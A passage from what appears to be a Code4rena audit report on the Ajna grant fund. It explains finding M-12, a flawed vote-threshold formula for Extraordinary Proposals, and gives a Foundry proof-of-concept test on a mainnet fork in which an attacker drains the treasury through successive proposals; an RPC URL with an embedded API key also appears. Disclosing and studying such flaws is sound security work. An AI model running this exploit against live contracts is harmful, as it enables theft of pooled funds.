focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/164\">[M-12] Governance attack on Extraordinary Proposals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/164\">0xRobocop</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/294\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/184\">ktg</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/173\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/154\">Dug</a></em></p>\n<p>The mechanics for Extraordinary proposals are simple and robust for attacks. There is a variable that is called Minimum Threshold (MT). The maximum amount of treasury tokens that can be requested on a proposal is bounded by MT. Basically, you can request any amount of tokens up to a maximum percentage of (1 - MT).</p>\n<p>For a proposal to succeed, it needs a percentage of non-treasury tokens equal or greater than:</p>\n<p><code>MT + percentage of treasury tokens requested</code></p>\n<p>Quoting the whitepaper:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">a. A proposer requests tokens equivalent to 10% of the treasury</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   i. 50% + 10% = 60%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   ii. If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   iii. If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released</span></span></code></pre>\n<p>For example, if you want to request the max percentage of treasury tokens, that is <code>1 - MT</code>, the proposal will need <code>(1 - MT) + MT</code> percentage of non-treasury tokens, it means 100%. Note that I am not giving a specific value for <code>MT</code>, so this should hold for any extraordinary proposal, even when the value of <code>MT</code> changes. The design is correct, but the implementation is not. The implementation of the constraint of votes needed for a proposal is implemented as follows:</p>\n<p><code>votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage)</code></p>\n<p>To see where is the mistake, we must convert the above formula into percentages, so we can compared it with what is written in the whitepaper. We know that <code>votesReceived</code> is some percentage (P1) of Non-treasury tokens, <code>tokensRequested</code> is some percentage (P2) of treasury tokens and <code>_getSliceOfNonTreasury(minThresholdPercentage)</code> is some percentage (P3) of Non-treasury tokens.</p>\n<p>We also know that P2 is bounded by the minimum threshold, because we want to test the case where the maximum is requested then P2 becomes <code>(1 - MT)</code> and we know that P3 is <code>MT</code>. Re-writing:</p>\n<p><code>(P1)(NonTreasuryT) = (1 - MT)(TreasuryT) + (MT)(NonTreasuryT)</code></p>\n<p>I changed <code>>=</code> for <code>=</code> because I am interested on the minimum votes needed. Divide by <code>NonTreasuryT</code>, rewrite:</p>\n<p><code>P1 = ((1 - MT)(TreasuryT) / (NonTreasuryT)) + MT</code></p>\n<p>Now we have the formula re-written in terms of percentages, where we can see that <code>1 - MT</code> which is the percentage of requested treasury tokens is multiplied by the division of <code>TreasuryT / NonTreasuryT</code>. This has the consequence of reducing <code>1 - MT</code> since <code>NonTreasuryT</code> will be greater than <code>TreasuryT</code>. For example, let’s take the case where the 1st proposal request the maximum amount of treasury tokens, that is, 50%.</p>\n<p><code>P1 = ((50%)(TreasuryT) / (NonTreasuryT)) + 50%</code></p>\n<p>Is clearly to see that P1 will be smaller than 100% (in the case where TreasuryT &#x3C; NonTreasuryT), violating the design described on the whitepaper.</p>\n<p>The proof of concept presented below is a scenario based on a total supply of 1B tokens, and a treasury of 300M tokens. In this scenario:</p>\n<p><code>P1 = ((50%)(300M) / (700M)) + 50% == 71.4%</code></p>\n<p>If we want to request again the maximum treasury tokens on the second proposal we will need:</p>\n<p><code>P1 = ((45%)(150M) / (850M)) + 55% == 62.94%</code></p>\n<p>We see a reduction on the percentage of non-treasury tokens needed between proposals, which should not happen, remember than on the design described on the whitepaper a proposal always need 100% of non treasury tokens when requesting the max amount of treasury tokens, no mattering the value of <code>MT</code>.</p>\n<p>The PoC shows a possible scenario where an attacker can take advantage of this mistake that will allow him to drain the treasury if he manages to execute the first proposal.</p>\n<p>The PoC is based on the assumption that the attacker manages to get a big portion (385M out of 700 non treasury tokens) of ajna tokens and convince other holders (115M of tokens) to vote (or delegate to him) for his proposal requesting the 50% of the treasury. If the attacker manages to achieve this, then he can drain the treasury alone, using the next proposals (because of the reduction of the percentage needed), even without the help of the previous holders.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Create a file under <code>test/unit/</code> and call it <code>ExploitEF.t.sol</code></li>\n<li>\n<p>Copy and paste the following:</p>\n<p>// SPDX-License-Identifier: MIT\npragma solidity 0.8.16;</p>\n<p>import { GrantFund }             from ”../../src/grants/GrantFund.sol”;\nimport { IExtraordinaryFunding } from ”../../src/grants/interfaces/IExtraordinaryFunding.sol”;\nimport { IFunding }              from ”../../src/grants/interfaces/IFunding.sol”;\nimport { GrantFundTestHelper }   from “../utils/GrantFundTestHelper.sol”;\nimport { IAjnaToken }            from “../utils/IAjnaToken.sol”;\nimport { DrainGrantFund }        from “../interactions/DrainGrantFund.sol”;</p>\n<p>contract ExploitEF is GrantFundTestHelper {</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">IAjnaToken        internal  _token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">GrantFund         internal  _grantFund;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Ajna token Holder at the Ajna contract creation on mainnet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenDeployer  = 0x666cf594fB18622e1ddB91468309a7E194ccb799;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _attacker   = makeAddr(&quot;_tokenHolder1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenHolder2   = makeAddr(&quot;_tokenHolder2&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenHolder3   = makeAddr(&quot;_tokenHolder3&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenHolder4   = makeAddr(&quot;_tokenHolder4&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenHolder5   = makeAddr(&quot;_tokenHolder5&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address internal _tokenHolder6   = makeAddr(&quot;_tokenHolder6&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address[] internal _votersArrAttacker = [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _attacker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address[] internal _votersArr = [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenHolder2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenHolder3,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenHolder4,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenHolder5,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenHolder6</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address[] internal _helperAttackerDelegatee = [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _attacker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// at this block on mainnet, all ajna tokens belongs to _tokenDeployer</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 internal _startBlock      = 16354861;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// at this block on mainnet, 1B ajna tokens where burned, reducing the supply to 1B.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 internal _startBlock2      = 16478160;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function setUp() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.createSelectFork(&quot;https://eth-mainnet.g.alchemy.com/v2/V2bjD46crGUhn4EDk92txmvC0BFqLzjo&quot;, _startBlock2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(_tokenDeployer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Ajna Token contract address on mainnet</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _token = IAjnaToken(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // deploy growth fund contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _grantFund = new GrantFund();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // initial minter distributes tokens to test addresses</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _transferAjnaTokens(_token, _votersArrAttacker, 385_000_000 * 1e18, _tokenDeployer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _transferAjnaTokens(_token, _votersArr, 23_000_000 * 1e18, _tokenDeployer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // initial minter distributes treasury to grantFund</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // A treasury with 300M ajna tokens (Using whitepaper values)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    changePrank(_tokenDeployer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _token.approve(address(_grantFund), 300_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _grantFund.fundTreasury(300_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function test_drainTreasury() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    STATUS:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Attacker has 385M of ajna tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Holders from 2 to 6 have 23M of ajna tokens each, total of = 115M</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - TotalSupply is 1B ajna tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Treasury is 300M ajna tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Non-Treasury tokens are 700M tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_attacker), 385_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_grantFund.treasury(), 300_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_grantFund.getSliceOfNonTreasury(1e18), 700_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacker self delegates</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // All holders delegate their tokens to the attacker.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _delegateTo(_token, _votersArr, _helperAttackerDelegatee);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  vm.roll(_startBlock2 + 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // set proposal params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 endBlockParam = block.number + 100_000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   // 150M tokens requested, that is 50% of treasury</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 tokensRequestedParam = 150_000_000 * 1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal targets</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address[] memory targets = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  targets[0] = address(_token);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal values</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256[] memory values = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  values[0] = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bytes[] memory calldatas = new bytes[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  calldatas[0] = abi.encodeWithSignature(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &quot;transfer(address,uint256)&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokensRequestedParam</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // create and submit proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _grantFund,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    endBlockParam,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    targets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    values,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    calldatas,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &quot;We are requesting 50% of the treasury since this is a super important and big development for the ecosystem&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacker has 500M of voting power which is ~ 71.4% of Non-Treasury Tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 attackerVotingPowerForEP = _grantFund.getVotesExtraordinary(_attacker, testProposal.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(attackerVotingPowerForEP, 500_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  changePrank(_attacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _grantFund.voteExtraordinary(testProposal.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Proposal state is Succeeded with only a 500M voting power.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacker was able to request 50% of treasury with only 71.4% of the Non-treasury tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Whitepaper says that in order to request 50% of tokens (1st proposal, so Minium Threshold equals 50%), </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // the proposal will need 50% + 50% = 100% of Non-Treasury tokens. Which here is demostrated that you only need 71.4%.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  IFunding.ProposalState proposalState = _grantFund.state(testProposal.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Succeeded));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // execute proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(testProposal.description)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Status after the 1st proposal success:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Attacker has 535M of ajna tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Holders from 2 to 6 have 23M of ajna tokens each, total of = 125M</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - TotalSupply is 1B ajna tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Treasury is 150M ajna tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - Non-Treasury tokens are 850M tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_attacker), 535_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder2), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder3), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder4), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder5), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_tokenHolder6), 23_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_grantFund.treasury(), 150_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_grantFund.getSliceOfNonTreasury(1e18), 850_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  /*</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    After the 1st proposal has succeed, the attacker now can drain the treasury alone, without the previous delegators.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    This happens because the formula actually makes it easier to execute further extraordinary proposals.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    For example the previous proposal required 71.4% of non-treasury tokens to pass a proposal of 50% of treasury tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    I will show how the second proposal will only require 62.94% of non-treasury tokens to pass a proposal of 45% of treasury tokens.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Which is a slightly increase from 500M needed to 535M needed, that is only a 7% difficulty increase. Whereas the attacker increased his</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    voting power from 385M to 535M (thanks to proposal 1) which is a 39% increase in his voting power.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Holders now delegates for them</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _delegateTo(_token, _votersArr, _votersArr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  vm.roll(_startBlock2 + 500);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // set proposal params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 endBlockParam2 = block.number + 100_000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   // 67.5 tokens requested, that is 45% of treasury</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 tokensRequestedParam2 = 67_500_000 * 1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal targets</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address[] memory targets2 = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  targets2[0] = address(_token);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal values</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256[] memory values2 = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  values2[0] = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // generate proposal calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  bytes[] memory calldatas2 = new bytes[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  calldatas2[0] = abi.encodeWithSignature(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &quot;transfer(address,uint256)&quot;,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokensRequestedParam2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // create and submit proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  TestProposalExtraordinary memory testProposal2 = _createProposalExtraordinary(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _grantFund,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _attacker,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    endBlockParam2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    targets2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    values2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    calldatas2,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &quot;Thanks for proposal 1, now I will drain the treasury&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacker has 535M of voting power which is ~ 62.94% of Non-Treasury Tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256 attackerVotingPowerForEP2 = _grantFund.getVotesExtraordinary(_attacker, testProposal2.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(attackerVotingPowerForEP2, 535_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   changePrank(_attacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _grantFund.voteExtraordinary(testProposal2.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacher succeed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  IFunding.ProposalState proposalState2 = _grantFund.state(testProposal2.proposalId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(uint8(proposalState2), uint8(IFunding.ProposalState.Succeeded));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // execute proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  _grantFund.executeExtraordinary(targets2, values2, calldatas2, keccak256(bytes(testProposal2.description)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  // Attacker balance is now 602.5M</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  assertEq(_token.balanceOf(_attacker), 602_500_000 * 1e18);</span></span>\n<span 